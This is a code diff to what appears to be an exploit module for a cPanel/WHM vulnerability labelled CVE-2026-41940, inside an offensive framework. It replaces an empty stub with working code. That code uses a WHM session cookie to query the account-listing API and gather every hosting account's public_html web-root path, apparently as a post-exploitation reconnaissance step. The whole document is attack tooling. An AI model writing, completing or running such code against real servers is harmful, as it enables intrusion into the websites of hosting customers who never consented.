@@ -8,6 +8,7 @@ import base64
 import json
 import os
 import random
+import re
 from typing import Any, Dict, List, Optional
 
 from cpointed.core.engine import Target, TargetType
@@ -291,5 +292,43 @@ class CVE202641940(VulnerabilityModule):
         session: str,
         timeout: float,
     ) -> List[str]:
-        _ = client, session, timeout  # WHM UAPI live command: integrate per engagement playbook
-        return []
+        headers = {"Cookie": f"whostmgrsession={session}"}
+        paths: List[str] = []
+        seen: set[str] = set()
+        try:
+            r = await client.request("GET", "/json-api/listaccts", headers=headers, timeout=timeout)
+        except SessionError:
+            return paths
+        text = r.text or ""
+        for m in re.finditer(r"/home/(?:[^\"'\s<>]+?)/public_html", text):
+            base = m.group(0).rstrip("/")
+            if base not in seen:
+                seen.add(base)
+                paths.append(base)
+        try:
+            j = r.json()
+        except (json.JSONDecodeError, TypeError, ValueError):
+            return paths
+        candidates: List[Any] = []
+        if isinstance(j, dict):
+            if isinstance(j.get("data"), list):
+                candidates = j["data"]
+            elif isinstance(j.get("acct"), list):
+                candidates = j["acct"]
+            cr = j.get("cpanelresult")
+            if isinstance(cr, dict) and isinstance(cr.get("data"), list):
+                candidates = cr["data"]
+        for item in candidates:
+            if not isinstance(item, dict):
+                continue
+            user = (
+                item.get("user")
+                or item.get("username")
+                or item.get("account")
+            )
+            if isinstance(user, str) and user.isalnum():
+                p = f"/home/{user}/public_html"
+                if p not in seen:
+                    seen.add(p)
+                    paths.append(p)
+        return paths
